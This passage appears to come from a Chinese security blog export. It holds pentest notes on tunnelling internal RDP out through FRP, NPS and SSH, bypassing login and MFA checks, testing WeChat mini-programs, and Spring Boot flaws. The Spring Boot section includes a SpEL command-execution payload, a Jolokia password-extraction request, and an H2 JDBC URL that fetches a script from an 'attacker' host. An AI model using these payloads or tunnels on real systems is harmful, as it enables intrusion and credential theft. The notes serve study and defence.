<li>在本机（或 VPS）通过 RDP 连接 <code>127.0.0.1:10000</code>，即可访问目标机器的 RDP 服务。</li>
</ul>
<hr>
<h2 id="2-FRP-（fast-reverse-proxy）"><a href="#2-FRP-（fast-reverse-proxy）" class="headerlink" title="2. FRP （fast reverse proxy）"></a>2. FRP （fast reverse proxy）</h2><h3 id="服务端（公网-VPS）frps-配置"><a href="#服务端（公网-VPS）frps-配置" class="headerlink" title="服务端（公网 VPS）frps + 配置"></a>服务端（公网 VPS）frps + 配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>

<p>启动服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>

<h3 id="客户端（内网目标）frpc-配置"><a href="#客户端（内网目标）frpc-配置" class="headerlink" title="客户端（内网目标）frpc + 配置"></a>客户端（内网目标）frpc + 配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = &lt;VPS_IP&gt;</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[rdp]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 3389</span><br><span class="line">remote_port = 6000</span><br></pre></td></tr></table></figure>

<p>启动客户端：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure>

<h3 id="连接方式"><a href="#连接方式" class="headerlink" title="连接方式"></a>连接方式</h3><ul>
<li>使用 RDP 客户端连接 <code>VPS_IP:6000</code>，即可访问目标机器的 RDP 服务 </li>
<li><a href="https://www.junjienotes.com/tips/%E9%80%9A%E8%BF%87frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%AE%9E%E7%8E%B0windows-rdp%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%8E%A7%E5%88%B6/?utm_source=chatgpt.com"><strong>通过FRP内网穿透实现Windows RDP远程桌面控制</strong></a></li>
<li><a href="https://blog.csdn.net/qq_42688495/article/details/123120151?utm_source=chatgpt.com"><strong>FRP内网穿透</strong></a>。</li>
</ul>
<hr>
<h2 id="3-NPS（内网穿透代理）"><a href="#3-NPS（内网穿透代理）" class="headerlink" title="3. NPS（内网穿透代理）"></a>3. NPS（内网穿透代理）</h2><h3 id="服务端（VPS）："><a href="#服务端（VPS）：" class="headerlink" title="服务端（VPS）："></a>服务端（VPS）：</h3><p>下载并运行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./nps -c nps.conf</span><br></pre></td></tr></table></figure>

<p>或安装为服务，访问 Web 控制面板配置端口转发 。</p>
<p>您可在 Web 界面添加 TCP 映射，如映射内网主机的 3389 端口到公网端口。</p>
<h3 id="客户端（内网目标）"><a href="#客户端（内网目标）" class="headerlink" title="客户端（内网目标）"></a>客户端（内网目标）</h3><p>编辑 <code>npc.conf</code>，指定要连接的 server 和 key，然后运行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./npc -c npc.conf</span><br></pre></td></tr></table></figure>

<p>完毕后即可通过映射的公网端口访问目标内网 RDP 服务 。</p>
<hr>
<h3 id="对比总结"><a href="#对比总结" class="headerlink" title="对比总结"></a>对比总结</h3><table>
<thead>
<tr>
<th>工具</th>
<th>架构</th>
<th>配置方式</th>
<th>优劣</th>
</tr>
</thead>
<tbody><tr>
<td>lcx</td>
<td>客户端 ↔ VPS ↔ 本地</td>
<td>命令行参数</td>
<td>简单直接，但需两个进程</td>
</tr>
<tr>
<td>FRP</td>
<td>frpc ↔ frps</td>
<td>frp.ini 文件，支持多个隧道</td>
<td>灵活、功能丰富</td>
</tr>
<tr>
<td>NPS</td>
<td>npc ↔ nps</td>
<td>支持 Web 面板配置</td>
<td>更方便管理，功能强大</td>
</tr>
</tbody></table>
<hr>
<h3 id="使用建议"><a href="#使用建议" class="headerlink" title="*** 使用建议"></a>*** 使用建议</h3><ul>
<li><strong>测试&#x2F;临时场景</strong>：lcx 非常直接，只需一条命令即可完成。</li>
<li><strong>稳定&#x2F;多隧道需求</strong>：推荐 FRP，支持多个端口，配置灵活，兼容性广。</li>
<li><strong>可视化管理&#x2F;复杂映射</strong>：NPS 带 Web 界面，适合多人协作和频繁配置调整。</li>
</ul>
<hr>
<p><strong>扩展：SSH隧道示例</strong>（通用）：</p>
<p><strong>客户端执行：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -R 6000:localhost:3389 user@VPS_IP</span><br></pre></td></tr></table></figure>

<ul>
<li>将内网端 RDP 3389 转发到 VPS 的 6000 端口。</li>
</ul>
<p>在 VPS 使用 <code>localhost:6000</code> 即可访问目标。</p>
<h2 id="内网穿透-总结"><a href="#内网穿透-总结" class="headerlink" title="#内网穿透-总结"></a>#内网穿透-总结</h2><p>说白了，内网穿透就是一个端口映射问题，</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>Intranet</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场练习-身份认证</title>
    <url>/2025/06/17/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h1><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><h3 id="响应时间异常"><a href="#响应时间异常" class="headerlink" title="响应时间异常"></a>响应时间异常</h3><h5 id="利用因子：存在响应时间判断用户名的可能"><a href="#利用因子：存在响应时间判断用户名的可能" class="headerlink" title="利用因子：存在响应时间判断用户名的可能"></a>利用因子：存在响应时间判断用户名的可能</h5><p>密码账号认证存在响应时间差距，当密码长度100+时，用户名正确，校验密码时间将过长，适用于按顺序解析的账号密码</p>
<p>注：新版bp没有respose time了，可以用如下列，也可以用logger++插件</p>
<table>
<thead>
<tr>
<th align="center">字段</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>Response received</strong></td>
<td align="center">收到响应头的时间（即服务端开始响应）</td>
</tr>
<tr>
<td align="center"><strong>Response completed</strong></td>
<td align="center">整个响应体（HTML&#x2F;JSON等）加载完的时间</td>
</tr>
</tbody></table>
<span id="more"></span>

<h3 id="限制失败次数"><a href="#限制失败次数" class="headerlink" title="限制失败次数"></a>限制失败次数</h3><h5 id="利用因子：登录会刷新积累的失败次数"><a href="#利用因子：登录会刷新积累的失败次数" class="headerlink" title="利用因子：登录会刷新积累的失败次数"></a>利用因子：登录会刷新积累的失败次数</h5><p>正确账号密码绕过爆破限制，就是时不时登录已知的正确账号刷新失败次数</p>
<p>注：X-Forwarded-For: 116.23.165.1 一般不用这个了，比较远古</p>
<h3 id="限制账号登录"><a href="#限制账号登录" class="headerlink" title="限制账号登录"></a>限制账号登录</h3><h5 id="利用因子：用户体量极大"><a href="#利用因子：用户体量极大" class="headerlink" title="利用因子：用户体量极大"></a>利用因子：用户体量极大</h5><p>爆破随机账号，适用于用户体量大的</p>
<p>即任意账号，限制密码个数</p>
<h3 id="常规账号登录"><a href="#常规账号登录" class="headerlink" title="常规账号登录"></a>常规账号登录</h3><h5 id="利用因子：存在多个认证因素时，不报错"><a href="#利用因子：存在多个认证因素时，不报错" class="headerlink" title="利用因子：存在多个认证因素时，不报错"></a>利用因子：存在多个认证因素时，不报错</h5><p>例如：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;carlos&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;pass&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;abc&quot;</span><span class="punctuation">,</span><span class="string">&quot;123456&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="—多因素认证—"><a href="#—多因素认证—" class="headerlink" title="—多因素认证—"></a>—多因素认证—</h3><hr>
<h5 id="–-第二因素脆弱"><a href="#–-第二因素脆弱" class="headerlink" title="–!第二因素脆弱"></a>–!第二因素脆弱</h5><p>例如：图形验证码可用captcha-killer插件绕过，短信验证码4位数字可爆破</p>
<p>如果是人脸或者指纹、加密狗这类的，建议直接<strong>前端绕过</strong>跑api，或者寻找<strong>注册接口</strong>，也可以尝试<strong>伪造用户标识</strong></p>
<h5 id="–-第二因素不授权"><a href="#–-第二因素不授权" class="headerlink" title="–!第二因素不授权"></a>–!第二因素不授权</h5><p>即有缺陷的双因素验证逻辑</p>
<p>有些应用你登录了就会给token，其他第二因素认证就是一个前端，直接绕过就行</p>
<h5 id="–-token本身存在越权"><a href="#–-token本身存在越权" class="headerlink" title="–!token本身存在越权"></a>–!token本身存在越权</h5><p>例如cookie本身可解密，且包含用户信息，例如解密后，user&#x3D;test，直接改成user&#x3D;admin</p>
<hr>
<p><u>小技巧</u></p>
<p>bp中存在session，可用用宏跑规定的请求包，替换session以保证服务正常运行，turbo intuder可用自定义python爆破</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>article</tag>
      </tags>
  </entry>
  <entry>
    <title>关于微信的渗透</title>
    <url>/2025/06/13/%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E7%9A%84%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h1 id="rpc连接"><a href="#rpc连接" class="headerlink" title="rpc连接"></a>rpc连接</h1><h2 id="1-wxdevtools-jsrpc"><a href="#1-wxdevtools-jsrpc" class="headerlink" title="1.wxdevtools+jsrpc"></a>1.wxdevtools+jsrpc</h2><p>强开devtools限定小程序为8555</p>
<p>使其他文件“只读”，则微信只能使用8555</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">icacls &quot;C:\TestFolder&quot; /deny <span class="variable">%username%</span>:W</span><br></pre></td></tr></table></figure>

<p>利用websock，直接跑参数，可忽略加密</p>
<p>注：小程序默认只支持wss，可能还限制域名</p>
<h2 id="2-工具-taro-wxtool-jsrpc"><a href="#2-工具-taro-wxtool-jsrpc" class="headerlink" title="2.工具&#x2F;taro-wxtool+jsrpc"></a>2.工具&#x2F;taro-wxtool+jsrpc</h2><p>注意：报错 _typeof3 is not a function</p>
<span id="more"></span> 

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span><span class="string">` `</span><span class="title function_">_typeof2</span>(<span class="params">o</span>) &#123;</span><br><span class="line">  <span class="string">``</span><span class="string">&quot;@babel/helpers - typeof&quot;</span><span class="string">``</span>;</span><br><span class="line">  <span class="string">``</span><span class="keyword">return</span><span class="string">` `</span>(_typeof2 = <span class="string">``</span><span class="string">&quot;function&quot;</span><span class="string">` `</span>== <span class="string">``</span><span class="keyword">typeof</span><span class="string">` `</span><span class="title class_">Symbol</span> &amp;&amp; <span class="string">``</span><span class="string">&quot;symbol&quot;</span><span class="string">` `</span>== <span class="string">``</span><span class="keyword">typeof</span><span class="string">` `</span><span class="title class_">Symbol</span>.<span class="property">iterator</span> ? <span class="string">``</span><span class="keyword">function</span><span class="string">``</span>(o) &#123;</span><br><span class="line">      <span class="string">``</span><span class="keyword">return</span><span class="string">` `</span><span class="keyword">typeof</span><span class="string">` `</span>o;</span><br><span class="line">  <span class="string">``</span>&#125; : <span class="string">``</span><span class="keyword">function</span><span class="string">``</span>(o) &#123;</span><br><span class="line">      <span class="string">``</span><span class="keyword">return</span><span class="string">` `</span>o &amp;&amp; <span class="string">``</span><span class="string">&quot;function&quot;</span><span class="string">` `</span>== <span class="string">``</span><span class="keyword">typeof</span><span class="string">` `</span><span class="title class_">Symbol</span> &amp;&amp; o.<span class="property">constructor</span> === <span class="title class_">Symbol</span> &amp;&amp; o !== <span class="title class_">Symbol</span>.<span class="property"><span class="keyword">prototype</span></span> ? <span class="string">``</span><span class="string">&quot;symbol&quot;</span><span class="string">` `</span>: <span class="string">``</span><span class="keyword">typeof</span><span class="string">` `</span>o;</span><br><span class="line">  <span class="string">``</span>&#125;)(o);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span><span class="string">` `</span><span class="title function_">_typeof</span>(<span class="params">o</span>) &#123;</span><br><span class="line">  <span class="string">``</span><span class="keyword">return</span><span class="string">` `</span><span class="string">&quot;function&quot;</span><span class="string">` `</span>== <span class="string">``</span><span class="keyword">typeof</span><span class="string">` `</span><span class="title class_">Symbol</span> &amp;&amp; <span class="string">``</span><span class="string">&quot;symbol&quot;</span><span class="string">` `</span>=== <span class="title function_">_typeof2</span>(<span class="title class_">Symbol</span>.<span class="property">iterator</span>) ? <span class="variable language_">module</span>.<span class="property">exports</span> = _typeof = <span class="string">``</span><span class="keyword">function</span><span class="string">``</span>(o) &#123;</span><br><span class="line">      <span class="string">``</span><span class="keyword">return</span><span class="string">` `</span><span class="title function_">_typeof2</span>(o);</span><br><span class="line">  <span class="string">``</span>&#125; : <span class="variable language_">module</span>.<span class="property">exports</span> = _typeof = <span class="string">``</span><span class="keyword">function</span><span class="string">``</span>(o) &#123;</span><br><span class="line">      <span class="string">``</span><span class="keyword">return</span><span class="string">` `</span>o &amp;&amp; <span class="string">``</span><span class="string">&quot;function&quot;</span><span class="string">` `</span>== <span class="string">``</span><span class="keyword">typeof</span><span class="string">` `</span><span class="title class_">Symbol</span> &amp;&amp; o.<span class="property">constructor</span> === <span class="title class_">Symbol</span> &amp;&amp; o !== <span class="title class_">Symbol</span>.<span class="property"><span class="keyword">prototype</span></span> ? <span class="string">``</span><span class="string">&quot;symbol&quot;</span><span class="string">` `</span>: <span class="title function_">_typeof2</span>(o);</span><br><span class="line">  <span class="string">``</span>&#125;, <span class="title function_">_typeof</span>(o);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = _typeof;</span><br></pre></td></tr></table></figure>



<h3 id="（2）-扩展-ngrok-jsrpc-映射"><a href="#（2）-扩展-ngrok-jsrpc-映射" class="headerlink" title="（2）.扩展  ngrok+jsrpc 映射"></a>（2）.扩展  ngrok+jsrpc 映射</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ngrok http 12080</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> demo = <span class="keyword">new</span> <span class="title class_">Hlclient</span>(<span class="string">&quot;wss://xxxxxxxxx.ngrok-free.app/ws?group=zzz&quot;</span>);</span><br></pre></td></tr></table></figure>





<h2 id="3-手机小程序调试"><a href="#3-手机小程序调试" class="headerlink" title="3.手机小程序调试"></a>3.手机小程序调试</h2><p><a href="http://debugx5.qq.com/">http://debugx5.qq.com/</a></p>
<h1 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h1><h2 id="1-js-node-server"><a href="#1-js-node-server" class="headerlink" title="1.js+node-server"></a>1.js+node-server</h2>]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>article</tag>
      </tags>
  </entry>
  <entry>
    <title>spring-boot详解</title>
    <url>/2025/06/06/spring-boot%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<blockquote>
<h1 id="一、Spring-Boot基础与安全机制"><a href="#一、Spring-Boot基础与安全机制" class="headerlink" title="一、Spring Boot基础与安全机制"></a><strong>一、Spring Boot基础与安全机制</strong></h1><h4 id="1-Spring-Boot定义"><a href="#1-Spring-Boot定义" class="headerlink" title="1. Spring Boot定义"></a>1. <strong>Spring Boot定义</strong></h4><ul>
<li><strong>核心定位</strong>：Spring Boot是Spring生态的子项目，用于简化Spring应用的初始搭建和开发流程，提供自动化配置（<code>@EnableAutoConfiguration</code>）、内嵌服务器（Tomcat&#x2F;Jetty）和Starter依赖机制。</li>
<li><strong>关键特性</strong>：<ul>
<li>无XML配置，通过<code>spring-boot-starter-*</code>依赖自动装配组件。</li>
<li>Actuator模块提供生产环境监控端点（如<code>/env</code>、<code>/health</code>），默认暴露敏感信息。</li>
</ul>
</li>
</ul>
<h4 id="2-安全机制缺陷"><a href="#2-安全机制缺陷" class="headerlink" title="2. 安全机制缺陷"></a>2. <strong>安全机制缺陷</strong></h4><ul>
<li><strong>默认暴露路由</strong>：Actuator端点未授权访问导致信息泄露。</li>
<li><strong>配置不当</strong>：开发环境配置误用于生产环境（如Swagger、Actuator未关闭）。</li>
<li><strong>依赖链风险</strong>：第三方库（如SnakeYAML、XStream）的反序列化漏洞被利用。</li>
</ul>
<span id="more"></span>

<hr>
<h3 id="二、Spring-Boot历史漏洞详解"><a href="#二、Spring-Boot历史漏洞详解" class="headerlink" title="二、Spring Boot历史漏洞详解"></a><strong>二、Spring Boot历史漏洞详解</strong></h3><h4 id="1-信息泄露类漏洞"><a href="#1-信息泄露类漏洞" class="headerlink" title="1. 信息泄露类漏洞"></a>1. <strong>信息泄露类漏洞</strong></h4><ul>
<li><strong>敏感数据暴露</strong><ul>
<li><p><strong>漏洞路径</strong>：<code>/env</code>、<code>/actuator/env</code> 泄露环境变量、数据库密码（部分脱敏字段可被绕过）16。</p>
</li>
<li><p><strong>脱敏绕过</strong>：通过Jolokia接口调用MBean获取星号（<code>******</code>）遮掩的密码明文：</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jolokia</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;<span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;</span>, <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;getProperty&quot;</span>, <span class="string">&quot;arguments&quot;</span>: [<span class="string">&quot;security.user.password&quot;</span>]&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>接口详情泄露</strong><ul>
<li><strong>Swagger路由</strong>：<code>/v2/api-docs</code>、<code>/swagger-ui.html</code> 暴露API文档及参数。</li>
</ul>
</li>
</ul>
<h4 id="2-远程代码执行（RCE）漏洞"><a href="#2-远程代码执行（RCE）漏洞" class="headerlink" title="2. 远程代码执行（RCE）漏洞"></a>2. <strong>远程代码执行（RCE）漏洞</strong></h4><p>以下是12类核心RCE漏洞的对比与利用要点：</p>
<table>
<thead>
<tr>
<th align="left"><strong>漏洞名称</strong></th>
<th align="left"><strong>利用条件</strong></th>
<th align="left"><strong>利用方法</strong></th>
<th align="left"><strong>关键路径</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>Whitelabel Error Page SpEL</strong></td>
<td align="left">Spring Boot 1.1.0-1.3.0</td>
<td align="left">注入SpEL表达式：<code>$&#123;T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;)&#125;</code></td>
<td align="left">触发错误页面的参数（如<code>?id=</code>)</td>
</tr>
<tr>
<td align="left"><strong>Spring Cloud SnakeYAML RCE</strong></td>
<td align="left">依赖<code>spring-cloud-starter</code></td>
<td align="left">设置<code>spring.cloud.bootstrap.location</code>指向恶意YAML文件</td>
<td align="left"><code>/env</code> + <code>/refresh</code></td>
</tr>
<tr>
<td align="left"><strong>Eureka XStream反序列化</strong></td>
<td align="left">使用Eureka服务发现</td>
<td align="left">修改<code>eureka.client.serviceUrl.defaultZone</code>指向恶意XStream Payload</td>
<td align="left"><code>/env</code> + <code>/refresh</code></td>
</tr>
<tr>
<td align="left"><strong>Jolokia Logback JNDI</strong></td>
<td align="left">Jolokia端点开放 + Logback依赖</td>
<td align="left">通过<code>ch.qos.logback.classic.jmx.JMXConfigurator</code>加载远程恶意XML</td>
<td align="left"><code>/jolokia</code> + <code>POST</code>请求</td>
</tr>
<tr>
<td align="left"><strong>H2 Database Console JNDI</strong></td>
<td align="left">启用H2 Console（默认<code>/h2-console</code>）</td>
<td align="left">利用JDBC URL触发JNDI注入：<code>jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3/;INIT=RUNSCRIPT FROM &#39;http://attacker/exp.sql&#39;</code></td>
<td align="left"><code>/h2-console</code>登录后的JDBC执行点</td>
</tr>
<tr>
<td align="left"><strong>MySQL JDBC反序列化</strong></td>
<td align="left">使用MySQL驱动 + 可外连</td>
<td align="left">劫持JDBC连接至恶意MySQL服务器，发送Gadget链</td>
<td align="left">修改<code>spring.datasource.url</code>属性</td>
</tr>
</tbody></table>
<blockquote>
<p>💡 <strong>利用链共性</strong>：多数RCE依赖Actuator的<code>/env</code>端点修改环境变量，并通过<code>/refresh</code>或<code>/restart</code>触发配置生效。</p>
</blockquote>
<hr>
<h3 id="三、黑盒安全评估检查清单"><a href="#三、黑盒安全评估检查清单" class="headerlink" title="三、黑盒安全评估检查清单"></a><strong>三、黑盒安全评估检查清单</strong></h3><h4 id="1-路由探测与版本识别"><a href="#1-路由探测与版本识别" class="headerlink" title="1. 路由探测与版本识别"></a>1. <strong>路由探测与版本识别</strong></h4><ul>
<li><strong>默认路由扫描</strong>：<ul>
<li>Actuator 1.x根路径：<code>/env</code>、<code>/heapdump</code>。</li>
<li>Actuator 2.x根路径：<code>/actuator/env</code>、<code>/actuator/heapdump</code>。</li>
<li>自定义路径：尝试<code>/manage</code>、<code>/appenv</code>等常见替代路径。</li>
</ul>
</li>
<li><strong>版本依赖关系</strong>：<br><strong>Spring Cloud与Boot版本兼容表</strong>：</li>
</ul>
<table>
<thead>
<tr>
<th align="left">Spring Cloud</th>
<th align="left">Spring Boot</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Edgware</td>
<td align="left">1.5.x (不兼容2.x)</td>
</tr>
<tr>
<td align="left">Finchley</td>
<td align="left">2.0.x</td>
</tr>
<tr>
<td align="left">Hoxton</td>
<td align="left">2.2.x-2.3.x</td>
</tr>
</tbody></table>
<h4 id="2-敏感端点检测"><a href="#2-敏感端点检测" class="headerlink" title="2. 敏感端点检测"></a>2. <strong>敏感端点检测</strong></h4><ul>
<li><strong>高风险端点</strong>：</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">/env            # 环境变量与配置</span><br><span class="line">/jolokia/list   # 列出所有MBean</span><br><span class="line">/heapdump       # 下载堆内存快照（含敏感数据）</span><br><span class="line">/trace          # 查看HTTP请求记录（含Cookie）</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>信息泄露验证</strong>：<br>检查<code>/v2/api-docs</code>是否返回API JSON结构；访问<code>/swagger-ui.html</code>确认接口详情。</li>
</ul>
<h4 id="3-漏洞利用验证流程"><a href="#3-漏洞利用验证流程" class="headerlink" title="3. 漏洞利用验证流程"></a>3. <strong>漏洞利用验证流程</strong></h4><ol>
<li><strong>信息收集</strong>：<ul>
<li>访问<code>/env</code>搜索<code>password</code>、<code>secret</code>等关键词。</li>
<li>检查<code>******</code>字段，尝试Jolokia明文提取。</li>
</ul>
</li>
<li><strong>RCE触发</strong>：<ul>
<li>修改环境变量（如<code>spring.datasource.url</code>注入恶意JDBC）。</li>
<li>调用<code>/refresh</code>或<code>/restart</code>生效配置。</li>
</ul>
</li>
<li><strong>内存分析</strong>：<ul>
<li>下载<code>/heapdump</code>，使用MAT工具分析内存中的密码明文。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="四、防御建议"><a href="#四、防御建议" class="headerlink" title="四、防御建议"></a><strong>四、防御建议</strong></h3><ol>
<li><strong>端点管控</strong>：<ul>
<li>生产环境关闭Actuator或通过<code>management.endpoints.web.exposure.include</code>限制暴露端点。</li>
</ul>
</li>
<li><strong>依赖安全</strong>：<ul>
<li>避免使用有漏洞的组件（如XStream &lt; 1.4.17、SnakeYAML &lt; 1.31）。</li>
</ul>
</li>
<li><strong>配置加固</strong>：<ul>
<li>重命名敏感端点路径（如<code>management.endpoints.web.path-mapping.env=internal-env</code>）。</li>
<li>启用Spring Security对Actuator端点鉴权。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="五、学习资源"><a href="#五、学习资源" class="headerlink" title="五、学习资源"></a><strong>五、学习资源</strong></h3><ol>
<li><p><strong>漏洞项目</strong>：</p>
<ul>
<li><a href="https://github.com/LandGrey/SpringBootVulExploit">LandGrey&#x2F;SpringBootVulExploit</a>：含漏洞环境与PoC。</li>
</ul>
</li>
<li><p><strong>深度分析</strong>：</p>
<ul>
<li><a href="https://cloud.tencent.cn/developer/article/2278104">Spring {Boot, Data, Security}历史漏洞研究</a>：漏洞原理与调试方法。</li>
</ul>
</li>
<li><p><strong>实验环境</strong>：</p>
<ul>
<li><a href="https://github.com/vulhub/vulhub/tree/master/spring/spring-boot-actuator">vulhub&#x2F;spring-boot-actuator</a></li>
</ul>
</li>
<li><p><strong>推荐工具</strong>：</p>
<ol>
<li><h6 id="heapdump-tool"><a href="#heapdump-tool" class="headerlink" title="heapdump_tool"></a><a href="https://www.aliyundrive.com/s/GapNjP3a9Rx">heapdump_tool</a></h6></li>
<li><h6 id="SpringBoot-Scan"><a href="#SpringBoot-Scan" class="headerlink" title="SpringBoot-Scan"></a><a href="https://gitcode.com/AabyssZG/SpringBoot-Scan">SpringBoot-Scan</a></h6></li>
<li><h6 id="Swagger-API-Exploit"><a href="#Swagger-API-Exploit" class="headerlink" title="Swagger API Exploit"></a><a href="https://github.com/lijiejie/swagger-exp">Swagger API Exploit</a></h6></li>
</ol>
</li>
<li><p><strong>常见案列</strong>：</p>
<ol>
<li><a href="https://blog.csdn.net/yunli0/article/details/117817987">10个Spring Boot 优秀学习项目_springboot项目</a></li>
</ol>
</li>
</ol>
<p>此框架覆盖了Spring Boot漏洞的核心场景，从原理到实践形成闭环，可作为渗透测试和安全加固的标准化参考。</p>
</blockquote>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>article</tag>
      </tags>
  </entry>
  <entry>
    <title>Guid-v1参数</title>
    <url>/2025/06/05/Guid-v1%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="详解GUID：结构、版本与V1的安全隐患"><a href="#详解GUID：结构、版本与V1的安全隐患" class="headerlink" title="详解GUID：结构、版本与V1的安全隐患"></a>详解GUID：结构、版本与V1的安全隐患</h2><h3 id="什么是GUID？"><a href="#什么是GUID？" class="headerlink" title="什么是GUID？"></a>什么是GUID？</h3><p>GUID（全局唯一标识符）是一个128位（16字节）的唯一标识符，通常表示为32个十六进制字符（8-4-4-4-12格式）。它在分布式系统中广泛用于生成无需中央协调的唯一ID，例如数据库主键、COM对象标识等。</p>
<h3 id="GUID结构解析"><a href="#GUID结构解析" class="headerlink" title="GUID结构解析"></a>GUID结构解析</h3><p>一个标准GUID的结构如下（以V1为例）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxxxxxxx-xxxx-Mxxx-Nxxx-xxxxxxxxxxxx</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>M</strong>：版本号（V1为<code>1</code>）</li>
<li><strong>N</strong>：变体标识（通常为<code>8</code>&#x2F;<code>9</code>&#x2F;<code>A</code>&#x2F;<code>B</code>）</li>
<li><strong>时间戳</strong>：前60位（高32位 + 中16位的前12位）</li>
<li><strong>时钟序列</strong>：13-16位（M后4位 + N前2位）</li>
<li><strong>节点MAC</strong>：最后48位（后6字节）</li>
</ul>
<span id="more"></span>

<h3 id="V1-GUID的安全问题"><a href="#V1-GUID的安全问题" class="headerlink" title="V1 GUID的安全问题"></a>V1 GUID的安全问题</h3><p>V1 GUID的设计缺陷在于其包含可预测的明文信息：</p>
<ol>
<li><strong>MAC地址泄露</strong>：最后6字节直接暴露生成机器的物理地址</li>
<li><strong>时间戳可逆</strong>：前60位包含精确到100ns的生成时间（从1582年10月15日起）</li>
<li><strong>序列号可枚举</strong>：时钟序列空间仅14位（16384种可能）</li>
</ol>
<h3 id="示例代码：解析V1-GUID"><a href="#示例代码：解析V1-GUID" class="headerlink" title="示例代码：解析V1 GUID"></a>示例代码：解析V1 GUID</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义解析结果结构</span></span><br><span class="line">GUIDv1Info = namedtuple(<span class="string">&#x27;GUIDv1Info&#x27;</span>, [<span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;mac&#x27;</span>, <span class="string">&#x27;clock_seq&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_guidv1</span>(<span class="params">guid_str</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解析V1 GUID并提取敏感信息&quot;&quot;&quot;</span></span><br><span class="line">    guid = uuid.UUID(guid_str)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 验证版本</span></span><br><span class="line">    <span class="keyword">if</span> guid.version != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Not a version 1 GUID&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取MAC地址 (最后6字节)</span></span><br><span class="line">    mac = <span class="string">&#x27;:&#x27;</span>.join([<span class="string">f&quot;<span class="subst">&#123;guid.<span class="built_in">hex</span>[i:i+<span class="number">2</span>]&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>, <span class="number">32</span>, <span class="number">2</span>)])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取时钟序列 